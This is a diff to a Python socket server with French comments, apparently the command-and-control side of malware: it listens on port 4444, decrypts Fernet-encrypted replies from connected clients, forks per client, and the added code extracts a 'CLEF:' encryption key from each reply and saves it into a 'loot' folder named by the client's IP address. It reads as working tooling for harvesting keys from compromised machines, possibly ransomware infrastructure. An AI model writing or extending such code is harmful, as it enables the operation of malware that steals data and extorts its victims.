@@ -8,7 +8,6 @@ from cryptography.fernet import Fernet
 HOST = "0.0.0.0"
 PORT = 4444
 
-
 # On charge la cle generee par le script generate_key.py
 try:
     with open("secret.key", "rb") as key_file:
@@ -69,16 +68,27 @@ def gerer_client(conn, addr):
                     print("[-] Le client a ferme la connexion.")
                     break
                     
-                
                 try:
                     reponse = cipher.decrypt(reponse_encrypted).decode("utf-8")
                     print(reponse)
+                    
+                    
+                    # Si la reponse contient la cle, on l'extrait et on la sauvegarde
+                    if "CLEF:" in reponse:
+                        cle_extraite = reponse.split("CLEF:")[1].strip()
+                        nom_fichier_cle = f"loot/cle_{addr[0]}.txt"
+                        
+                        with open(nom_fichier_cle, "w") as f:
+                            f.write(cle_extraite)
+                        print(f"[+] Cle de chiffrement sauvegardee dans {nom_fichier_cle}")
+                    
                 
                 except Exception as e:
                     print(f"[-] Erreur de dechiffrement (le client est-il a jour ?) : {e}")
     finally:
         conn.close()
         print(f"[-] Deconnexion de {addr}")
+
 
 def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -93,8 +103,7 @@ def main():
         sys.exit(1)
 
     # 4. Boucle principale avec gestion multi-OS
-    
-    try:  # <--- AJOUT ICI
+    try:  
         while True:
             conn, addr = server.accept()
             
@@ -117,7 +126,7 @@ def main():
                     conn.close()
                     print(f"[*] Processus fils cree (PID: {pid}) pour le client {addr}")
                     
-    except KeyboardInterrupt:  # <--- AJOUT ICI
+    except KeyboardInterrupt:  
         print("\n[-] Arret du serveur...")
         server.close()
         sys.exit(0)
